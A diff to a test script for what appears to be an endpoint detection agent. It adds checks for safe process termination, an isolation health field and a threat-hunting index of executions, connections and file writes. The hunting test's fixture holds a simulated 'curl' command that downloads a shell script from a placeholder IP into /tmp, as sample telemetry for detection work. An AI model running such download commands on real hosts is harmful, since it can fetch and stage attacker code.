@@ -98,7 +98,7 @@ check(acks == [("c1", "ok"), ("c2", "unsupported")] and a.state.get("bundle_id")
 # 6. heartbeat carries the protocol's health fields
 h = a.health()
 check({"agent_version", "queue_depth", "last_window_end_ns", "cpu_pct", "rss_mb", "spool_mb", "spool_dropped_unscored",
-       "spool_dropped_unuploaded", "entities", "update", "disk_free_mb", "disk_free_pct"} == set(h) and h["rss_mb"] > 0 and h["disk_free_mb"] > 0,
+       "spool_dropped_unuploaded", "entities", "update", "disk_free_mb", "disk_free_pct", "isolated"} == set(h) and h["rss_mb"] > 0 and h["disk_free_mb"] > 0,
       f"health {h}")
 
 # 7. updates: without the host updater only reported; with it: pull credential, request file, exit 75
@@ -124,6 +124,56 @@ check(not a.request_update(offer) and a.update_health()["failed"] == ["9.9.9"], 
 open(_os.path.join(a.cfg.data_dir, "update-trial.env"), "w").write("VERSION=x\n")
 a.confirm_update()
 check(open(_os.path.join(a.cfg.data_dir, "update-ok")).read().strip() == a_version, "after an update the first heartbeat confirms the new version")
+check(a.update_health()["state"] == "none", "once confirmed, health no longer reports a trial (the updater clears its files at the next start)")
+
+# 8. response: stop a process only while its pid still is the alerted process
+import subprocess as _sp
+from types import SimpleNamespace
+child = _sp.Popen(["sleep", "300"])
+uuid_now = f"proc:boot:{child.pid}:0"
+a.source = SimpleNamespace(procs=SimpleNamespace(current={child.pid: SimpleNamespace(uuid=uuid_now)}))
+r1 = a.kill_process(child.pid, f"proc:boot:{child.pid}:7", f"subject /usr/bin/sleep sleep 300")
+check(r1.startswith("not stopped") and child.poll() is None, f"a different identity on the same pid is not touched ({r1})")
+check(a.kill_process(1, "x", "").startswith("refused"), "pid 1 is never stopped")
+r2 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
+child.wait(timeout=5)
+check(r2.startswith("ok") and child.returncode == -9, f"the alerted process is stopped ({r2})")
+r3 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
+check(r3.startswith("not stopped"), "an ended process is reported, not retried")
+check(a.health()["isolated"] is False, "health reports isolation state")
+
+# 9. hunting: the activity index records programs run (with command line), addresses contacted and files written,
+#    de-duplicated; a hunt searches it and posts the matches back
+from pdp_agent.agent import _observable
+a = make_agent("ebpf")
+sh = Entity.process("p:sh", "/bin/sh", "sh -c curl")
+cu = Entity.process("p:curl", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh")
+exe = Entity.file("file:/usr/bin/curl", "/usr/bin/curl")
+nf = Entity.socket("n:1", "203.0.113.9", 80)
+out = Entity.file("f:/tmp/x_1.sh", "/tmp/x_1.sh")
+prc = Entity.file("f:/proc/self/attr", "/proc/self/attr")
+t = time.time_ns()
+evs = [([exe, cu], Event(t, exe.uuid, "EXECUTE", cu.uuid, "h1")), ([cu, nf], Event(t + 1, cu.uuid, "CONNECT", nf.uuid, "h2")),
+       ([nf, cu], Event(t + 2, nf.uuid, "RECVFROM", cu.uuid, "h3")), ([cu, out], Event(t + 3, cu.uuid, "WRITE", out.uuid, "h4")),
+       ([cu, out], Event(t + 9, cu.uuid, "WRITE", out.uuid, "h5")), ([cu, prc], Event(t + 4, cu.uuid, "WRITE", prc.uuid, "h6")),
+       ([out, cu], Event(t + 5, out.uuid, "READ", cu.uuid, "h7"))]
+check(_observable(exe, "EXECUTE", cu) == ("exec", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh"), "exec: program and command line")
+check(_observable(cu, "CONNECT", nf) == _observable(nf, "RECVFROM", cu) == ("net", "/usr/bin/curl", "203.0.113.9:80"), "net: both directions, ip:port")
+check(_observable(cu, "WRITE", prc) is None and _observable(out, "READ", cu) is None, "/proc writes and reads are not indexed")
+a.ingest(evs)
+a.state.add_observables(a._obs); a._obs = {}
+w = a.state.hunt("x_1.sh", "write")
+check(len(w) == 1 and w[0]["count"] == 2 and w[0]["first_ns"] == t + 3 and w[0]["last_ns"] == t + 9, f"writes de-duplicated with first/last seen ({w})")
+check({r["kind"] for r in a.state.hunt("203.0.113.9")} == {"exec", "net"} and len(a.state.hunt("203.0.113.9", "net")) == 1, "search over program and object, kind filter")
+check(a.state.hunt("x%1") == [] and {r["kind"] for r in a.state.hunt("X_1")} == {"exec", "write"}, "LIKE wildcards in the query are literal; case-insensitive")
+a.handle_command({"id": "c9", "command": "hunt", "hunt_id": "h-1", "q": "curl", "kind": "net"})
+posted = a.tr.paths("/hunts/h-1")
+check(len(posted) == 1 and posted[0][2][0]["object"] == "203.0.113.9:80" and a.tr.paths("/commands/c9/ack")[-1][2]["result"] == "ok: 1 matches",
+      "hunt command posts the matches and acknowledges")
+a.handle_command({"id": "c10", "command": "hunt", "hunt_id": "h-2", "q": "nothing-here"})
+check(a.tr.paths("/hunts/h-2")[0][2] == [{"none": True}], "no match is answered explicitly")
+a.state.c.execute("UPDATE observables SET last_ns = 1 WHERE kind='write'"); a.state.c.commit()
+check(a.state.prune_observables() == 1 and a.state.hunt("x_1.sh", "write") == [], "entries not seen for 30 days are pruned")
 
 print("FAILURES:", fails)
 sys.exit(1 if fails else 0)
